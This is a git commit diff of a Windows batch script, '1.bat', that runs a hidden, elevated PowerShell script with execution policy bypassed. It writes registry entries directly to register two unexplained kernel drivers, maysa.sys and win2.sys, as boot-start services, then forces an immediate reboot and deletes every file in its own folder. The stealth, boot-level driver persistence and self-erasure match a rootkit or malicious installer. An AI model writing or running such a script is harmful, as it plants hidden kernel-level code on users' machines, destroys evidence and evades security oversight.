3f7a91f109f6fb48f732159db1e3a950db08a3dc
xmannn32 <ferhatcan555534@gmail.com>
2025-08-27 23:13:26 +0300

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -22,11 +22,58 @@ powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle H
 powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%2.ps1\"'"
 
 
-sc create maysa binPath= "C:\Windows\System32\maysa.sys" DisplayName= "arsal" start= boot tag= 1 type= kernel group= "System Reserved" >nul 2>&1
-sc create win2 binPath= "C:\Windows\System32\win2.sys" DisplayName= "maysa" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
+:: Set your service name here
+set ServiceName=maysa
+
+:: Driver file path relative to system root
+set DriverPath=System32\maysa.sys
+
+:: Create registry key for the service
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /f
+
+:: Set ImagePath (driver file)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v ImagePath /t REG_EXPAND_SZ /d "%DriverPath%" /f
+
+:: Set Type = 1 (Kernel Driver)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Type /t REG_DWORD /d 1 /f
+
+:: Set Start = 0 (Boot start)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Start /t REG_DWORD /d 0 /f
+
+:: Set ErrorControl = 1 (Normal)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v ErrorControl /t REG_DWORD /d 1 /f
+
+:: Set Group = Boot Bus Extender (optional for early load)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Group /t REG_SZ /d "Boot Bus Extender" /f
+
+
+:: Set your service name here
+set ServiceNamee=win2
+
+:: Driver file path relative to system root
+set DriverPathh=System32\win2.sys
+
+:: Create registry key for the service
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /f
+
+:: Set ImagePath (driver file)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v ImagePath /t REG_EXPAND_SZ /d "%DriverPathh%" /f
+
+:: Set Type = 1 (Kernel Driver)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Type /t REG_DWORD /d 1 /f
+
+:: Set Start = 0 (Boot start)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Start /t REG_DWORD /d 0 /f
+
+:: Set ErrorControl = 1 (Normal)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v ErrorControl /t REG_DWORD /d 1 /f
+
+:: Set Group = Boot Bus Extender (optional for early load)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Group /t REG_SZ /d "Boot Bus Extender" /f
+
 
 endlocal
-C:\Windows\system32\cmd.exe /c shutdown /r /t 2
+C:\Windows\system32\cmd.exe /c shutdown /r /t 0
 
 cd /d "%~dp0"
 del /f /q *.*
